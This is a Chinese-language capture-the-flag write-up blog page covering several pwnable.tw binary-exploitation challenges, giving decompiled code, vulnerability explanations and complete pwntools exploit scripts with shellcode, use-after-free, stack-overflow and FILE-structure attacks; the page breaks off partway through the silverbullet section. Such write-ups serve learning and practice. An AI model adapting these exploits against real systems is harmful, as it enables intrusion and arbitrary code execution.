@@ -1,0 +1,2205 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-pwnable.tw WriteUp</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/github.css">
+<link rel="stylesheet" href="/speciou.css"
+</head><body>    <div class="container">        <header class="main-header">            <h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1>            <nav class="main-header__nav">                <ul class="main-nav">                    <li class="main-nav__list"><a class="main-nav__list__link active" href="/" target="_self">HOME</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="/archives/"                            target="_self">ARCHIVE</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"                            target="_blank">GITHUB</a></li>                </ul>            </nav>        </header>    </div><div class="typora-export os-windows"><div id="write" class>
+<p><strong>2021-3-13 12:56</strong></p>
+<h1>pwnable.tw BUUOJ WriteUp</h1>
+<blockquote>
+<p>我实在 <strong><a href="https://buuoj.cn/">buu</a></strong> 上面刷的，所以环境、顺序原来的网址有区别</p>
+</blockquote>
+<!-- more -->
+<h2>pwnable_orw</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>orw_seccomp</code></p>
+<p>沙箱开启</p>
+<p><a href="https://imgtu.com/i/6EQvv9"><img src="https://s3.ax1x.com/2021/03/03/6EQvv9.png" alt="6EQvv9.png" /></a></p>
+<p>如何题意，只能执行<code>open</code> <code>read</code> <code>write</code>三种函数</p>
+<p><code>main</code></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf(&quot;Give my your shellcode:&quot;);
+  read(0, &amp;shellcode, 0xC8u);
+  (shellcode)();
+  return 0;
+}
+</code></pre>
+<p>执行我们输入的字符串，意思就是写orw_shellcode读flag</p>
+<ul>
+<li>EXP</li>
+</ul>
+<p>可以当orw祖传shellcode</p>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = remote(&quot;node3.buuoj.cn&quot;,26098)
+
+shellcode = shellcraft.open('/flag')
+shellcode += shellcraft.read('eax','esp',100)
+shellcode += shellcraft.write(1,'esp',100)
+shellcode = asm(shellcode)
+p.recvuntil(&quot;Give my your shellcode:&quot;)
+p.sendline(shellcode)
+p.interactive()
+</code></pre>
+<h2>pwnable_start</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>程序修改了入口函数，这样就只有start段</p>
+<pre><code class="language-assembly">public _start
+proc near               ; DATA XREF: LOAD:08048018↑o
+push    esp
+push    offset _exit
+xor     eax, eax
+xor     ebx, ebx
+xor     ecx, ecx
+xor     edx, edx
+push    ':FTC'
+push    ' eht'
+push    ' tra'
+push    'ts s'
+push    2774654Ch
+mov     ecx, esp        ; addr
+mov     dl, 20          ; len
+mov     bl, 1           ; fd
+mov     al, 4           ; syscall(write)
+int     80h             ; LINUX - sys_write
+xor     ebx, ebx        ; ebx清零
+mov     dl, 60          ; len
+mov     al, 3           ; syscall(read)
+int     80h             ; LINUX -
+add     esp, 14h
+retn
+endp ; sp-analysis failed
+</code></pre>
+<p>发现read和write都使用了int 80h系统调用和 <strong>dl</strong>寄存器， <strong>dl</strong>寄存器是16位下的edx寄存器</p>
+<p><a href="https://imgtu.com/i/6E1kd0"><img src="https://s3.ax1x.com/2021/03/03/6E1kd0.png" alt="6E1kd0.png" /></a></p>
+<p>调试发现向下写20字节就可以覆盖EIP寄存器，从而返回地址</p>
+<p><strong>思路</strong></p>
+<p>主要是向程序写入shellcode，这样就要先泄露要写入的地址，然后在把EIP改为shellcode的地址，然后写入shellcode</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = process('./start')
+# p = remote(&quot;node3.buuoj.cn&quot;,27809)
+payload = 'a'*20 + p32(0x08048087)
+p.recvuntil(':')
+p.send(payload)
+print(payload)
+leak=u32(p.recv(4));
+print(hex(leak))
+shellcode= '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+payload= 'a'*20 + p32(leak+20)+shellcode
+p.send(payload)
+p.interactive()
+</code></pre>
+<h2>pwnable_hacknote</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>是一个堆得题，远程环境Ubuntu 16</p>
+<p><code>menu</code>菜单</p>
+<pre><code class="language-c">int MENU()
+{
+  puts(&quot;----------------------&quot;);
+  puts(&quot;       HackNote       &quot;);
+  puts(&quot;----------------------&quot;);
+  puts(&quot; 1. Add note          &quot;);
+  puts(&quot; 2. Delete note       &quot;);
+  puts(&quot; 3. Print note        &quot;);
+  puts(&quot; 4. Exit              &quot;);
+  puts(&quot;----------------------&quot;);
+  return printf(&quot;Your choice :&quot;);
+}
+</code></pre>
+<p><code>delete</code>删除功能</p>
+<pre><code class="language-c">  if ( ptr[v1] )
+  {
+    free(*(ptr[v1] + 1));
+    free(ptr[v1]);
+    puts(&quot;Success&quot;);
+  }
+</code></pre>
+<p>uaf漏洞</p>
+<p><strong>思路</strong></p>
+<p>利用uaf泄露libc_base，然后在该read为system</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+ 
+p = remote(&quot;chall.pwnable.tw&quot;, 10102)
+elf = ELF(&quot;./hacknote&quot;)
+libc = ELF(&quot;./libc_32.so.6&quot;)
+read_got = elf.got[&quot;read&quot;]
+pfputs = 0x804862b
+ 
+def add_note(size,index):
+      p.recvuntil(&quot;choice :&quot;)
+      p.sendline(&quot;1&quot;)
+      p.recvuntil(&quot;size :&quot;)
+      p.sendline(size)
+      p.recvuntil(&quot;Content :&quot;)
+      p.sendline(index)
+ 
+def delete_note(index):
+      p.recvuntil(&quot;choice :&quot;)
+      p.sendline(&quot;2&quot;)
+      p.recvuntil(&quot;Index :&quot;)
+      p.sendline(index)
+ 
+def print_note(index):
+      p.recvuntil(&quot;choice :&quot;)
+      p.sendline(&quot;3&quot;)
+      p.recvuntil(&quot;Index :&quot;)
+      p.sendline(index)
+ 
+add_note(&quot;16&quot;,&quot;aaaaa&quot;)
+add_note(&quot;16&quot;,&quot;aaaaa&quot;)
+delete_note('0')
+delete_note('1')
+add_note('8',p32(pfputs)+p32(read_got))
+print_note('0')
+pfread = u32(p.recv()[:4])
+pfsys = pfread - libc.symbols[&quot;read&quot;] + libc.symbols[&quot;system&quot;]
+delete_note('2')
+add_note('8',p32(pfsys)+&quot;;sh\x00&quot;)
+print_note('0')
+p.interactive()
+</code></pre>
+<h2>pwnable_asm</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>main</code></p>
+<pre><code class="language-c">  printf(&quot;give me your x64 shellcode: &quot;, stub, argv);
+  read(0, s + 46, 0x3E8uLL);
+  alarm(0xAu);
+  chroot(&quot;/home/asm_pwn&quot;);
+  sandbox();
+  (s)(&quot;/home/asm_pwn&quot;);
+</code></pre>
+<p>和orw差不多，只不过文件名变长了，而且是64位的</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+import sys
+context.log_level = &quot;debug&quot;
+context.arch = 'amd64'
+context.os = 'linux'
+
+if sys.argv[1] == &quot;l&quot;:
+    sh = process(&quot;./asm&quot;)
+else:
+    sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29455&quot;)
+shellcode = shellcraft.pushstr(&quot;flag&quot;)
+shellcode += shellcraft.open(&quot;rsp&quot;)
+shellcode += shellcraft.read('rax', 'rsp', 100)
+shellcode += shellcraft.write(1, 'rsp', 100)
+
+sh.sendlineafter(&quot;shellcode: &quot;, asm(shellcode))
+print sh.recvall()
+sh.close()
+</code></pre>
+<h2>pwnable_simple_login</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>auth</code></p>
+<pre><code class="language-c">_BOOL4 __cdecl auth(int base64len)
+{
+  char v2[8]; // [esp+14h] [ebp-14h] BYREF
+  char *s2; // [esp+1Ch] [ebp-Ch]
+  int v4; // [esp+20h] [ebp-8h] BYREF
+
+  memcpy(&amp;v4, &amp;input, base64len);               // 栈溢出
+  s2 = (char *)calc_md5(v2, 12);
+  printf(&quot;hash : %s\n&quot;, s2);
+  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;
+}
+</code></pre>
+<p>payload要用base64编码后再发出</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+import base64
+
+name = sys.argv[1]
+elf = ELF(name)
+libc = elf.libc
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	input_addr=0x0811EB40
+	correct_addr=0x08049284
+
+	sh.recvuntil(&quot;:&quot;)
+	payload='a'*4+p32(correct_addr)+p32(input_addr)
+	sh.send(payload.encode('base64'))
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;28273&quot;,0,1)
+</code></pre>
+<h2>pwnable_calc</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>calc</code></p>
+<pre><code class="language-c">unsigned int calc()
+{
+  int pool; // [esp+18h] [ebp-5A0h]
+  int v2[100]; // [esp+1Ch] [ebp-59Ch]
+  char equation; // [esp+1ACh] [ebp-40Ch]
+  unsigned int v4; // [esp+5ACh] [ebp-Ch]
+
+  v4 = __readgsdword(0x14u);                    // 计算 1+(2*1)
+  while ( 1 )
+  {
+    bzero(&amp;equation, 0x400u);
+    if ( !get_expr(&amp;equation, 1024) )           // equation变为 1+(2*1) + ( * )
+      break;
+    init_pool(&amp;pool);                           // 计算池清0
+    if ( real_calc(&amp;equation, &amp;pool) )          // 开始计算
+    {
+      printf(&quot;%d\n&quot;, v2[pool - 1]);
+      fflush(stdout);
+    }
+  }
+  return __readgsdword(0x14u) ^ v4;
+}
+</code></pre>
+<p>这里我改变了一些变量名，然后这个逆向过程很复杂，但是发现这可能是一个大家都熟悉的过程：数据结构：栈-&gt;逆波兰式（后缀表达式）的计算</p>
+<ul>
+<li>将一个普通的中缀表达式转换为<a href="https://baike.baidu.com/item/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">逆波兰表达式</a>的一般算法是：</li>
+</ul>
+<blockquote>
+<p>首先需要分配2个栈，一个作为临时存储运算符的栈S1（含一个结束符号），一个作为存放结果（逆波兰式）的栈S2（空栈），S1栈可先放入优先级最低的运算符#，注意，中缀式应以此最低优先级的运算符结束。可指定其他字符，不一定非#不可。从中缀式的左端开始取字符，逐序进行如下步骤：</p>
+<p>（1）若取出的字符是操作数，则分析出完整的运算数，该操作数直接送入S2栈。</p>
+<p>（2）若取出的字符是运算符，则将该运算符与S1栈栈顶元素比较，如果该运算符(不包括括号运算符)优先级高于S1栈栈顶运算符（包括左括号）优先级，则将该运算符进S1栈，否则，将S1栈的栈顶运算符弹出，送入S2栈中，直至S1栈栈顶运算符（包括左括号）低于（不包括等于）该<a href="https://baike.baidu.com/item/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/4752611">运算符优先级</a>时停止弹出运算符，最后将该运算符送入S1栈。</p>
+<p>（3）若取出的字符是“（”，则直接送入S1栈顶。</p>
+<p>（4）若取出的字符是“）”，则将距离S1栈栈顶最近的“（”之间的运算符，逐个出栈，依次送入S2栈，此时抛弃“（”。</p>
+<p>（5）重复上面的1~4步，直至处理完所有的输入字符。</p>
+<p>（6）若取出的字符是“#”，则将S1栈内所有运算符（不包括“#”），逐个出栈，依次送入S2栈。</p>
+<p>完成以上步骤，S2栈便为逆波兰式输出结果。不过S2应做一下逆序处理。便可以按照逆波兰式的计算方法计算了！</p>
+</blockquote>
+<blockquote>
+<p>下面以(a+b)*c为例子进行说明：</p>
+<p>(a+b)c的逆波兰式为ab+c，假设计算机把ab+c按从左到右的顺序压入栈中，并且按照遇到就把栈顶两个元素<strong>出栈</strong>，执行运算，得到的结果再入栈的原则来进行处理，那么ab+c的执行结果如下：</p>
+<p>1）a入栈（0位置）</p>
+<p>2）b入栈（1位置）</p>
+<p>3）遇到运算符“+”，将a和b出栈，执行a+b的操作，得到结果d=a+b，再将d入栈（0位置）</p>
+<p>4）c入栈（1位置）</p>
+<p>5）遇到运算符“<em>”，将d和c出栈，执行d</em>c的操作，得到结果e，再将e入栈（0位置）</p>
+<p>经过以上运算，计算机就可以得到(a+b)*c的运算结果e了。</p>
+</blockquote>
+<p><strong>漏洞点</strong></p>
+<p><code>get_expr</code></p>
+<pre><code class="language-c">  while ( expr_counter &lt; const_1024 &amp;&amp; read(0, &amp;expr, 1) != -1 &amp;&amp; expr != '\n' )
+  {
+    if ( expr == '+' || expr == '-' || expr == '*' || expr == '/' || expr == '%' || expr &gt; '/' &amp;&amp; expr &lt;= '9' )
+    {
+      i = expr_counter++;
+      *(equation + i) = expr;                   // 在计算式后面更上 加减。。
+    }
+  }
+</code></pre>
+<p>获取表达式时，没有对左值检验，所以我们可以第一个就是运算符</p>
+<p><img src="https://s3.ax1x.com/2021/03/04/6VFDqe.png" alt="6VFDqe.png" /></p>
+<p>所以这样运算就会有问题</p>
+<p>拿 <strong>+100</strong>这样的计算来举例，程序计算过程如下</p>
+<p><code>get_expr(&amp;equation, 1024)</code></p>
+<p>equation：<strong>+100+</strong></p>
+<p><code>real_calc(&amp;equation, &amp;pool)</code></p>
+<pre><code class="language-c">	  equation_cpy = i + 1 + equation;
+      if ( expr[j] )                            // expr -&gt; + ( * )
+      {
+        switch ( *(i + equation) )              // 读取运算符号
+                                                // 分别左值计算和右值计算
+        {
+          case '%':
+          case '*':
+          case '/':
+            if ( expr[j] != '+' &amp;&amp; expr[j] != '-' )
+            {
+              eval(calc_pool, expr[j]);
+              expr[j] = *(i + equation);
+            }
+            else
+            {
+              expr[++j] = *(i + equation);
+            }
+            break;
+          case '&amp;':
+          case '\'':
+          case '(':
+          case ')':
+          case ',':
+          case '.':
+            eval(calc_pool, expr[j--]);         // eval(calc_pool, +);
+            break;
+          case '+':
+          case '-':
+            eval(calc_pool, expr[j]);           // eval(calc_pool, +);
+                                                // calc_pool -&gt;
+                                                // reslut
+                                                // 1
+                                                // 2
+                                                // 1
+            expr[j] = *(i + equation);          // 运算符为下一个
+            break;
+        }
+      }
+      else
+      {
+        expr[j] = *(i + equation);
+      }
+      if ( !*(i + equation) )
+        break;
+    }
+</code></pre>
+<p>下个断点</p>
+<p><img src="https://s3.ax1x.com/2021/03/04/6Ve2Gj.png" alt="ZsdS1a" /></p>
+<p><code>eval(_DWORD *pools, char expr)</code></p>
+<pre><code class="language-c">  if ( expr == '+' )
+  {
+    pools[*pools - 1] += pools[*pools];         // pools[0]+=1
+  }
+</code></pre>
+<p>运行后</p>
+<p><img src="https://s3.ax1x.com/2021/03/04/6VmPFe.png" alt="" /></p>
+<pre><code class="language-c">  if ( expr == '+' )
+  {
+    pools[*pools - 1] += pools[*pools];         // pools[0]+=1
+  }
+</code></pre>
+<p>pools = 0xffffca88</p>
+<p>*pools = 0x64</p>
+<p>pools[*pools - 1] = 0xffffca88+4*0x64 = 0xffffcc18</p>
+<p>*0xffffcc18 = 0x3030312b00000000</p>
+<p>这样我们就可以利用数组一处进行任意地址读、写</p>
+<p><img src="https://v1ckydxp.github.io/images/stack.jpg" alt="stack" /></p>
+<p>我们按照栈的格式伪造一个栈来执行/bin/sh</p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+
+p=remote(&quot;node3.buuoj.cn&quot;,&quot;27237&quot;)
+#p = process('./calc.dms')
+
+keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32('/bin'),u32('/sh\0')]
+
+def leak_binsh_addr():
+    p.recv(1024)
+    p.sendline('+'+str(360))
+    ebp_addr = int(p.recv())
+    rsp_addr =((ebp_addr+0x100000000)&amp;0xFFFFFFF0)-16
+    binsh_addr = rsp_addr+20-0x100000000
+    return binsh_addr
+
+def write_stack(addr,content):
+    p.sendline('+'+str(addr))
+    recv = int(p.recv())
+    if content &lt; recv:
+        recv = recv - content
+        p.sendline('+'+str(addr)+'-'+str(recv))
+
+    else:
+        recv = content-recv
+        p.sendline('+'+str(addr)+'+'+str(recv))
+    p.recv()
+
+keys[4] = leak_binsh_addr()
+
+for i in range(8):
+    write_stack(361+i,keys[i])
+
+p.sendline('bye\n')
+p.interactive()
+</code></pre>
+<h2>pwnable_seethefile</h2>
+<blockquote>
+<p>记录一下， 64位ubuntu16在本地进行动态调试32位程序的的时候算出来的libc基址与目标文件的libc基址不一样， 要一样的话应该要搭一个docker去调试</p>
+</blockquote>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>main</code></p>
+<pre><code class="language-c">      case 5:
+        printf(&quot;Leave your name :&quot;);
+        __isoc99_scanf(&quot;%s&quot;, name);
+        printf(&quot;Thank you %s ,see you next time\n&quot;, name);
+        if ( fp )
+          fclose(fp);
+        exit(0);
+        return result;
+</code></pre>
+<pre><code class="language-assembly">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o
+.bss:0804B260                                         ; main+B4↑o
+.bss:0804B280                 public fp
+.bss:0804B280 ; FILE *fp
+.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
+.bss:0804B280                                         ; openfile+AD↑w ...
+.bss:0804B280 _bss            ends
+</code></pre>
+<p>在bss段上面有溢出，可以移除到fp，fp是文件的指针，fclose底层实现也会调用vtable的函数，可以伪造IO_FILE，把其中的vtable中的fclose的实现改为system，再填入参数就可以getshell</p>
+<pre><code>pwndbg&gt; x/wx 0x804B280
+0x804b280 &lt;fp&gt;:	0x0804c410
+</code></pre>
+<pre><code class="language-python">pwndbg&gt;  p *(struct _IO_FILE_plus *) 0x0804c410
+$2 = {
+  file = {
+    _flags = -72539000, 
+    _IO_read_ptr = 0x0, 
+    _IO_read_end = 0x0, 
+    _IO_read_base = 0x0, 
+    _IO_write_base = 0x0, 
+    _IO_write_ptr = 0x0, 
+    _IO_write_end = 0x0, 
+    _IO_buf_base = 0x0, 
+    _IO_buf_end = 0x0, 
+    _IO_save_base = 0x0, 
+    _IO_backup_base = 0x0, 
+    _IO_save_end = 0x0, 
+    _markers = 0x0, 
+    _chain = 0xf7fb3cc0 &lt;_IO_2_1_stderr_&gt;, 
+    _fileno = 3, 
+    _flags2 = 0, 
+    _old_offset = 0, 
+    _cur_column = 0, 
+    _vtable_offset = 0 '\000', 
+    _shortbuf = &quot;&quot;, 
+    _lock = 0x804c4a8, 
+    _offset = -1, 
+    _codecvt = 0x0, 
+    _wide_data = 0x804c4b4, 
+    _freeres_list = 0x0, 
+    _freeres_buf = 0x0, 
+    __pad5 = 0, 
+    _mode = 0, 
+    _unused2 = '\000' &lt;repeats 39 times&gt;
+  }, 
+  vtable = 0xf7fb2ac0 &lt;_IO_file_jumps&gt;
+}
+
+</code></pre>
+<p>伪造的IO_file_jumps</p>
+<pre><code class="language-python">	layout = [
+		0,0,
+		libc_base + libc.symbols['system'], 0,
+		0, 0, 0, 0,
+		elf.symbols['name'] + 0x28, 0,
+		u32('\x80\x80||'), u32('sh\0\0'),
+	]
+</code></pre>
+<p><img src="https://s3.ax1x.com/2021/03/05/6ZjltK.png" alt="dsad" /></p>
+<ul>
+<li>EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+import sys
+
+name = sys.argv[1]
+elf = ELF(name)
+libc=ELF('./libc_32.so.6')
+sh = 0
+
+l64 = lambda      :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))
+l32 = lambda      :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,&quot;\x00&quot;))
+sla = lambda a,b  :sh.sendlineafter(str(a),str(b))
+sa  = lambda a,b  :sh.sendafter(str(a),str(b))
+lg  = lambda name,data : sh.success(name + &quot;: 0x%x&quot; % data)
+se  = lambda payload: sh.send(payload)
+rl  = lambda      : sh.recv()
+sl  = lambda payload: sh.sendline(payload)
+ru  = lambda a     :sh.recvuntil(str(a))
+
+def cmd(ch):
+	sla(&quot;Your choice :&quot;,ch)
+
+def main(ip,port,debug,mode):
+	global sh
+	if debug==0:
+		context.log_level = &quot;debug&quot;
+	else:
+		pass
+	if mode==0:
+		sh = process(name)
+	else:
+		sh = remote(ip,port)
+
+	cmd(1)
+	sla(&quot;What do you want to see :&quot;,&quot;/proc/self/maps&quot;)
+	cmd(2)
+	cmd(3)
+	#cmd(2)
+	#cmd(3)
+	ru(&quot;[heap]\n&quot;)
+	addr = ru(&quot;-&quot;)[:-1]
+	libc_base = int(addr,16)+0x1000
+	lg(&quot;libc_base&quot;,libc_base)
+	system = libc_base + libc.sym[&quot;system&quot;]
+	lg(&quot;libc_base&quot;,libc_base)
+	lg(&quot;system&quot;,system)
+
+	layout = [
+		0,0,
+		libc_base + libc.symbols['system'], 0,
+		0, 0, 0, 0,
+		elf.symbols['name'] + 0x28, 0,
+		u32('\x80\x80||'), u32('sh\0\0'),
+	]
+
+	cmd(5)
+	gdb.attach(sh,&quot;b *0x8048AF5&quot;)
+	sla(&quot;Leave your name :&quot;, flat(layout).ljust(0x94 + 0x28, '\0') + p32(elf.symbols['name']))
+	sh.interactive()
+
+if __name__ == '__main__':
+	main(&quot;node3.buuoj.cn&quot;,&quot;25088&quot;,0,1)
+</code></pre>
+<h2>pwnable_otp</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p><code>main</code></p>
+<pre><code class="language-c">v13 = __readfsqword(0x28u);
+  if ( argc == 2 )
+  {
+    fd = open(&quot;/dev/urandom&quot;, 0, envp, argv);
+    if ( fd == -1 )
+      exit(-1);
+    if ( (unsigned int)read(fd, &amp;buf, 0x10uLL) != 16 )
+      exit(-1);
+    close(fd);
+    sprintf(&amp;s, &quot;/tmp/%llu&quot;, buf);
+    stream = fopen(&amp;s, &quot;w&quot;);
+    if ( !stream )
+      exit(-1);
+    fwrite(&amp;v7, 8uLL, 1uLL, stream);
+    fclose(stream);
+    puts(&quot;OTP generated.&quot;);
+    ptr = 0LL;
+    v10 = fopen(&amp;s, &quot;r&quot;);
+    if ( !v10 )
+      exit(-1);
+    fread(&amp;ptr, 8uLL, 1uLL, v10); //vuln
+    fclose(v10);
+    v4 = strtoul(*(const char **)(v5 + 8), 0LL, 16);
+    if ( v4 == ptr )
+    {
+      puts(&quot;Congratz!&quot;);
+      system(&quot;/bin/cat flag&quot;);
+    }
+    else
+    {
+      puts(&quot;OTP mismatch&quot;);
+    }
+    unlink(&amp;s);
+    result = 0;
+  }
+  else
+  {
+    puts(&quot;usage : ./otp [passcode]&quot;);
+    result = 0;
+  }
+  return result;
+</code></pre>
+<p><code>fread(&amp;ptr, 8uLL, 1uLL, v10);</code></p>
+<p>如果能够打开文件成功但是读取文件中内容的时候失败就能获取shell</p>
+<p>考点是ulimit</p>
+<pre><code>ULIMIT(3)                   Linux Programmer's Manual                   ULIMIT(3)
+
+NAME
+       ulimit - get and set user limits
+
+SYNOPSIS
+       #include &lt;ulimit.h&gt;
+
+       long ulimit(int cmd, long newlimit);
+
+DESCRIPTION
+       Warning:  This  routine  is obsolete.  Use getrlimit(2), setrlimit(2), and
+       sysconf(3) instead.  For the shell command ulimit(), see bash(1).
+
+       The ulimit() call will get or set some limit for the calling process.  The
+       cmd argument can have one of the following values.
+
+       UL_GETFSIZE
+              Return the limit on the size of a file, in units of 512 bytes.
+
+       UL_SETFSIZE
+              Set the limit on the size of a file.
+
+       3      (Not  implemented  for Linux.)  Return the maximum possible address
+              of the data segment.
+
+       4      (Implemented but no symbolic constant provided.)  Return the  maxi‐
+              mum number of files that the calling process can open.
+
+RETURN VALUE
+       On  success,  ulimit()  returns  a  nonnegative  value.   On  error, -1 is
+       returned, and errno is set appropriately.
+
+ERRORS
+       EPERM  A unprivileged process tried to increase a limit.
+
+ATTRIBUTES
+       For an explanation of the terms used in this section, see attributes(7).
+
+       ┌──────────┬───────────────┬─────────┐
+       │Interface        │ Attribute                │ Value         │
+       ├──────────┼───────────────┼─────────┤
+       │ulimit()         │ Thread safety            │ MT-Safe       │
+       └──────────┴───────────────┴─────────┘
+
+CONFORMING TO
+       SVr4, POSIX.1-2001.  POSIX.1-2008 marks ulimit() as obsolete.
+</code></pre>
+<blockquote>
+<p>ulimit 用于限制 shell 启动进程所占用的资源，支持以下各种类型的限制：所创建的内核文件的大小、进程数据块的大小、Shell 进程创建文件的大小、内存锁住的大小、常驻内存集的大小、打开文件描述符的数量、分配堆栈的最大大小、CPU 时间、单个用户的最大线程数、Shell 进程所能使用的最大虚拟内存。同时，它支持硬资源和软资源的限制。</p>
+<p>作为临时限制，ulimit 可以作用于通过使用其命令登录的 shell 会话，在会话终止时便结束限制，并不影响于其他 shell 会话。而对于长期的固定限制，ulimit 命令语句又可以被添加到由登录 shell 读取的文件中，作用于特定的 shell 用户。</p>
+<p><a href="https://man.linuxde.net/ulimit">链接：https://man.linuxde.net/ulimit</a></p>
+</blockquote>
+<p>设置shell所能创建的最大文件为0</p>
+<ul>
+<li>EXP</li>
+</ul>
+<p><img src="https://s3.ax1x.com/2021/03/05/6ZxPRU.png" alt="" /></p>
+<h2>pwnable_silverbullet</h2>
+<ul>
+<li>checksec</li>
+</ul>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>IDA</li>
+</ul>
+<p>得到两个结构体</p>
+<pre><code class="language-c">struct bullet
+{
+  char desc[0x30];
+  size_t size;
+};
+</code></pre>
+<pre><code class="language-c">struct struct_werewolf
+{
+  _DWORD HP;
+  char *Name;
+};
+</code></pre>
+<p><code>power_up</code></p>
+<pre><code class="language-c">int __cdecl power_up(bullet *bullet)
+{
+  char s; // [esp+0h] [ebp-34h]
+  size_t size; // [esp+30h] [ebp-4h]
+
+  size = 0;
+  memset(&amp;s, 0, 0x30u);
+  if ( !bullet-&gt;desc[0] )
+    return puts(&quot;You need create the bullet first !&quot;);
+  if ( bullet-&gt;size &gt; 0x2F )
+    return puts(&quot;You can't power up any more !&quot;);
+  printf(&quot;Give me your another description of bullet :&quot;);
+  read_input(&amp;s, 0x30 - bullet-&gt;size);
+  strncat(bullet-&gt;desc, &amp;s, 0x30 - bullet-&gt;size);
+  size = strlen(&amp;s) + bullet-&gt;size;
+  printf(&quot;Your new power is : %u\n&quot;, size);
+  bullet-&gt;size = size;
+  return puts(&quot;Enjoy it !&quot;);
+}
+</code></pre>
+<p><code>strncat(bullet-&gt;desc, &amp;s, 0x30 - bullet-&gt;size);</code></p>
